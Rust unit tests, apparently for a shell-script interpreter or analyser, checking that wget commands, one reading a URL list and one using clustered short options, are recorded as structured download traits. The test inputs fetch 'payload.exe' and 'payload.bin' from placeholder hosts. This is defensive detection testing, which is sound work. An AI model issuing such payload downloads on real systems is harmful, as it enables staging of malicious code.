    #[test]
    fn wget_input_file_reads_tracked_url_list() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"echo https://wget-input-file.example/payload.exe>urls.txt"#,
            &mut env,
        );
        interpret_line(r#"wget -i urls.txt -O payload.exe"#, &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://wget-input-file.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "wget -i tracked input file did not emit structured download: {:?}",
            env.traits
        );
        assert!(
            matches!(
                env.modified_filesystem.get("payload.exe"),
                Some(FsEntry::Download { src })
                    if src == "https://wget-input-file.example/payload.exe"
            ),
            "wget -i tracked input file did not record destination: {:?}",
            env.modified_filesystem
        );
    }

    #[test]
    fn wget_short_option_cluster_records_download() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"wget -qO C:\Temp\payload.bin https://wget-cluster.example/payload.bin"#,
            &mut env,
        );
        let downloads: Vec<_> = env
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
                _ => None,
            })
            .collect();
        assert_eq!(
            downloads,
            vec![(
                "https://wget-cluster.example/payload.bin",
                Some(r#"C:\Temp\payload.bin"#)
            )],
            "traits: {:?}",
            env.traits
        );
        assert!(env
            .modified_filesystem
            .contains_key(r#"c:\temp\payload.bin"#));
    }
